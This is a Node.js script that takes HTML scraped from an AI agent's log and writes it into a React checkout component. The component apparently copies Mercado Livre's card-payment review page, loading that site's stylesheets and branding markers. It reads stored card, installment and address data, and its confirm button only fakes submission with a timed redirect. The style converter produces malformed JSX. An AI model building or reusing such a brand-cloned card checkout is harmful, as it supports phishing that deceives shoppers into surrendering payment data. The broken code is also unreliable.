const fs = require('fs');

const log_path = "C:\\Users\\igore\\.gemini\\antigravity\\brain\\f6a9e7dd-be81-4672-b8df-9d7cbba6a512\\.system_generated\\logs\\overview.txt";

try {
    const logs = fs.readFileSync(log_path, 'utf8');

    // Find the LAST body block in the logs
    const regex = /(<body[\s\S]*?<\/body>)/gi;
    let match;
    let lastHtml = null;
    while ((match = regex.exec(logs)) !== null) {
        lastHtml = match[1];
    }

    if (lastHtml) {
        let html = lastHtml;

        // Convert HTML to JSX standard
        html = html.replace(/class="/g, 'className="');
        html = html.replace(/for="/g, 'htmlFor="');
        
        // Self closing tags fix
        html = html.replace(/<(img|hr|input|br)([^>]*?)(?<!\/)>/g, '<$1$2 />');

        // Style replacer
        html = html.replace(/style="([^"]+)"/g, (match, styleStr) => {
            if (styleStr.includes('[object Object]')) {
                return "style={{}}";
            }

            const props = styleStr.split(';');
            const styles = [];
            for (let prop of props) {
                if (!prop.trim()) continue;
                const parts = prop.split(':');
                if (parts.length >= 2) {
                    const key = parts.shift().trim();
                    const val = parts.join(':').trim();
                    
                    const keyParts = key.split('-');
                    const keyCamel = keyParts[0] + keyParts.slice(1).map(x => x.charAt(0).toUpperCase() + x.slice(1)).join('');
                    styles.push(`${keyCamel}: '${val}'`);
                }
            }
            return `style={{ { ${styles.join(', ')} } }}`;
        });

        html = html.replace(/tabindex=/g, 'tabIndex=');
        html = html.replace(/hidden="hidden"/g, 'hidden={true}');
        html = html.replace(/charset=/g, 'charSet=');
        html = html.replace(/checked=""/g, 'defaultChecked');
        html = html.replace(/brickid=/g, 'data-brickid=');
        html = html.replace(/defaultbricksmap=/g, 'data-defaultbricksmap=');
        html = html.replace(/brick=/g, 'data-brick=');
        html = html.replace(/autocomplete=/g, 'autoComplete=');
        html = html.replace(/autocapitalize=/g, 'autoCapitalize=');
        html = html.replace(/autocorrect=/g, 'autoCorrect=');
        html = html.replace(/spellcheck=/g, 'spellCheck=');
        html = html.replace(/maxlength=/g, 'maxLength=');
        html = html.replace(/<s>/g, '<s >'); // Quick fix for <s> tag
        
        const targetFile = "c:\\Users\\igore\\OneDrive\\Área de Trabalho\\metarat beta\\nova-merchant-hub\\src\\pages\\StoreCheckoutCardConfirmation.tsx";
        
        const basicComponent = `import React, { useEffect, useState } from 'react';
import { useNavigate } from "react-router-dom";
import { useStore } from "@/contexts/StoreContext";
import { useI18n } from "@/contexts/I18nContext";

const StoreCheckoutCardConfirmation = () => {
    const navigate = useNavigate();
    const { cartItems, cartTotal } = useStore();
    const { formatCurrencyParts } = useI18n();

    const [cardData, setCardData] = useState<any>(null);
    const [installments, setInstallments] = useState<any>(null);
    const [addressData, setAddressData] = useState<any>(null);
    const [isSubmitting, setIsSubmitting] = useState(false);

    useEffect(() => {
        if (cartItems.length === 0) {
            navigate("/store/cart", { replace: true });
            return;
        }

        const savedCard = localStorage.getItem('checkout_card_input');
        if (savedCard) try { setCardData(JSON.parse(savedCard)); } catch (e) { }

        const savedInst = localStorage.getItem('checkout_installment_selection');
        if (savedInst) try { setInstallments(JSON.parse(savedInst)); } catch (e) { }

        const savedAddr = localStorage.getItem('checkout_address');
        if (savedAddr) try { setAddressData(JSON.parse(savedAddr)); } catch (e) { }
    }, [cartItems, navigate]);

    const handleConfirm = () => {
        setIsSubmitting(true);
        setTimeout(() => {
            navigate("/store/checkout/confirmation");
        }, 1200);
    };

    useEffect(() => {
        const confirmBtn = document.getElementById('review_footer_confirm_button');
        const confirmBtn2 = document.getElementById('review_price_box_confirm_button');
        
        if (confirmBtn) confirmBtn.onclick = handleConfirm;
        if (confirmBtn2) confirmBtn2.onclick = handleConfirm;
        
        return () => {
            if (confirmBtn) confirmBtn.onclick = null;
            if (confirmBtn2) confirmBtn2.onclick = null;
        };
    }, []);

    // Set body attributes
    useEffect(() => {
        document.body.setAttribute("data-site", "MLB");
        document.body.setAttribute("data-country", "BR");
    }, []);

    const valFmt = installments ? formatCurrencyParts(installments.total) : formatCurrencyParts(cartTotal);

    return (
        <div id="ml-container">
            <style>
                {\`
                a#nav-skip-to-main-content { display: none !important; } 
                a#nav-a11y-feedback-link { display: none !important; }
                \`}
            </style>
            <link rel="stylesheet" href="https://http2.mlstatic.com/frontend-assets/buyingflow-review-frontend/index.desktop.7d2d8933.css" />
            <link rel="stylesheet" href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/widgets/6.15.0/modeless-box.css" />
            <link rel="stylesheet" href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.15.0/mercadolibre/navigation-desktop.css" />
            
            ${html}
        </div>
    );
};

export default StoreCheckoutCardConfirmation;
`;

        fs.writeFileSync(targetFile, basicComponent, 'utf8');
        console.log("Success! Created robust component with HTML from logs.");
    } else {
        console.log("Could not find HTML in logs");
    }
} catch(e) {
    console.error("Error:", e);
}
